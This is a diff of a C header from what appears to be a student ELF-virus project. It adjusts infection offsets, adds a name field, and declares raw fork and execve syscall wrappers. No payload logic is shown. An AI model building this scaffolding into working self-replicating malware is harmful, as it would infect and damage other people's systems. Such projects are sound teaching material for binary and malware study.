@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/08 16:01:11 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/08 18:35:31 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -32,14 +32,14 @@
 
 # define USER_ENTRY	2
 # define ROOT_ENTRY	4
-# define PROG_ENTRY	3
+# define PROG_ENTRY	2
 # define OC_ENTRY	8
 # define KEY_SIZE	64
 
 # define BUFF_SIZE	0x1000
 # define PROG_INFO	512
 
-# define ENTRY_OFF	2288
+# define ENTRY_OFF	2194
 # define KEY_OFF	28
 
 # define __INLINE__	__attribute__((__always_inline__)) inline
@@ -112,6 +112,7 @@ typedef struct	s_data
 	Elf64_Addr	vrs_entry;
 	Elf64_Addr	cpr_entry;
 
+	char		*name;
 	void		*rsp;
 	uint8_t		cpr_key[KEY_SIZE];
 	size_t		context;
@@ -147,6 +148,9 @@ void			*_memset(void *b, int c, size_t len);
 int				_strncmp(char *s1, char *s2, size_t n);
 size_t			_strlen(char *s);
 bool			check_name(char *str, int len);
+
+pid_t			_fork(void);
+int				_execve(const char *filename, char *const argv[], char *const envp[]);
 void			__exit(int status);
 int				_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 int				_open(const char *path, int flags, mode_t mode);
